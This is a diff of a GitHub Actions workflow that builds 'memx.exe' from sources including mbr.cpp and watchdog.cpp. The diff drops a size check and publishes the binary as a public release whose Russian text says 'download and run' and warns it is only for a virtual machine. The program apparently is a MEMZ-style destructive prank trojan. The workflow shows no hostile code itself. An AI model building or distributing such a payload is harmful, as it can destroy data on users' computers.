@@ -24,20 +24,19 @@ jobs:
           cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
           /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
           /SUBSYSTEM:WINDOWS /OUT:memx.exe
-          dir memx.exe
 
-      - name: Check file size
-        shell: bash
-        run: |
-          ls -la memx.exe
-          if [ ! -f memx.exe ] || [ $(stat -c%s memx.exe) -lt 10000 ]; then
-            echo "❌ memx.exe слишком маленький или не существует!"
-            exit 1
-          fi
-
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
         with:
-          name: memx-installer
-          path: memx.exe
-          retention-days: 30
+          files: memx.exe
+          tag_name: memx-${{ github.run_id }}
+          name: "💀 MEMX Build #${{ github.run_number }}"
+          body: |
+            ## MEMX.exe
+            
+            Скачай и запусти.
+            Размер: ~191 КБ
+            
+            ⚠️ ТОЛЬКО ДЛЯ ВИРТУАЛКИ!
+          draft: false
+          prerelease: true
